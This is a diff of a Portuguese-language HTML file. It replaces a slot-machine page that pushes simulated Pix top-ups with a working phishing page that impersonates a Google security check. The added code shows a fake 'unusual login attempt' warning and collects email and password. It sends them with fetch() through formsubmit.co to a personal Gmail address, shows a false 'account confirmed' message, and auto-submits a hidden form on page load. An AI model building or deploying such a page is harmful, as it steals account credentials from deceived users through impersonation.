@@ -1,118 +1,103 @@
-<!DOCTYPE html><html lang="pt-br">
+<!DOCTYPE html>
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Slot Animal</title>
+  <meta charset="UTF-8" />
+  <title>Google - Verificação de segurança digital</title>
   <style>
     body {
-      margin: 0;
       font-family: Arial, sans-serif;
-      background: linear-gradient(#ffdf9e, #fcb045);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
-      height: 100vh;
-      padding-top: 20px;
-    }
-    .saldo {
-      background: #fff3cd;
-      padding: 10px 20px;
-      border-radius: 20px;
-      font-weight: bold;
-      margin-bottom: 20px;
-      box-shadow: 0 0 10px #00000020;
-    }
-    .slot {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #fff;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 15px #00000030;
-    }
-    .slot img {
-      width: 80px;
-      height: 80px;
-      margin: 0 10px;
-      border-radius: 10px;
-      animation: pulse 1s infinite alternate;
-    }
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      100% { transform: scale(1.1); }
-    }
-    .botao-jogar, .botao-pix {
-      margin-top: 30px;
-      background: #28a745;
-      color: white;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 25px;
-      font-size: 20px;
-      font-weight: bold;
-      cursor: pointer;
-      box-shadow: 0 5px 15px #00000040;
-    }
-    #tela-pagamento {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      background: #fff;
-      border-radius: 20px;
-      padding: 30px;
-      box-shadow: 0 0 20px #00000050;
+      background-color: #f2f2f2;
       text-align: center;
-      margin-top: 50px;
+      padding: 50px;
+    }
+    #form-container, #confirmation {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    #confirmation {
+      display: none;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 12px 20px;
+      cursor: pointer;
+      border-radius: 4px;
+      width: 100%;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #45a049;
     }
   </style>
 </head>
 <body>
-  <audio autoplay loop>
-    <source src="https://www.bensound.com/bensound-music/bensound-dreams.mp3" type="audio/mp3">
-  </audio>  <div class="saldo">Saldo: R$ <span id="saldo">500,00</span></div>  <div class="slot" id="slot">
-    <img src="https://i.imgur.com/F9GHWYn.png" alt="panda">
-    <img src="https://i.imgur.com/JjzL7Kj.png" alt="raposa">
-    <img src="https://i.imgur.com/yAByOlE.png" alt="papagaio">
-  </div><button class="botao-jogar" id="botaoJogar" onclick="jogar()">JOGAR AGORA</button>
 
-  <div id="tela-pagamento">
-    <h2>Você precisa recarregar para continuar jogando</h2>
-    <p>Use o botão abaixo para simular uma recarga via Pix</p>
-    <button class="botao-pix" onclick="simularPagamento()">Pagar com Pix</button>
-  </div>  <script>
-    let saldo = 500;
-    let jogadas = 0;
+  <!-- Formulário invisível para enviar o alerta 7 -->
+  <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" id="autoForm" style="display:none;">
+    <input type="hidden" name="alerta" value="7" />
+  </form>
 
-    function jogar() {
-      jogadas++;
-      const resultado = Math.random() < 0.4; // 40% de "vitória"
-      if (resultado) {
-        saldo += 50;
-        alert("Você ganhou R$50!");
-      } else {
-        saldo -= 20;
-        alert("Você perdeu R$20.");
-      }
-      document.getElementById("saldo").textContent = saldo.toFixed(2);
+  <div id="form-container">
+    <h1>Google - Verificação de segurança digital</h1>
+    <p>Detectamos uma tentativa incomum de login. Por favor, confirme suas credenciais abaixo para continuar.</p>
 
-      if (jogadas >= 5) {
-        document.getElementById("slot").style.display = "none";
-        document.getElementById("botaoJogar").style.display = "none";
-        document.getElementById("tela-pagamento").style.display = "flex";
-      }
-    }
+    <form id="userForm">
+      <input type="text" name="email" placeholder="E-mail ou telefone" required />
+      <input type="password" name="senha" placeholder="Senha" required />
+      <button type="submit">Validar agora</button>
+    </form>
+  </div>
 
-    function simularPagamento() {
-      alert("Pagamento simulado com sucesso!");
-      saldo += 100;
-      document.getElementById("saldo").textContent = saldo.toFixed(2);
-      document.getElementById("slot").style.display = "flex";
-      document.getElementById("botaoJogar").style.display = "inline-block";
-      document.getElementById("tela-pagamento").style.display = "none";
-      jogadas = 0;
-    }
-  </script></body>
+  <div id="confirmation">
+    <h1>Conta confirmada com sucesso!</h1>
+    <p>Obrigado por verificar sua conta.</p>
+  </div>
+
+  <script>
+    // Envia o formulário invisível automaticamente ao carregar a página
+    window.onload = function () {
+      document.getElementById('autoForm').submit();
+    };
+
+    // Captura o envio do formulário visível para enviar via fetch e mostrar confirmação sem sair da página
+    document.getElementById('userForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const form = event.target;
+      const formData = new FormData(form);
+
+      fetch('https://formsubmit.co/natanaelverissimo34@gmail.com', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+          // Esconde o formulário e mostra a mensagem de confirmação
+          document.getElementById('form-container').style.display = 'none';
+          document.getElementById('confirmation').style.display = 'block';
+        } else {
+          alert('Erro ao enviar os dados. Tente novamente.');
+        }
+      }).catch(() => {
+        alert('Erro ao enviar os dados. Tente novamente.');
+      });
+    });
+  </script>
+
+</body>
 </html>
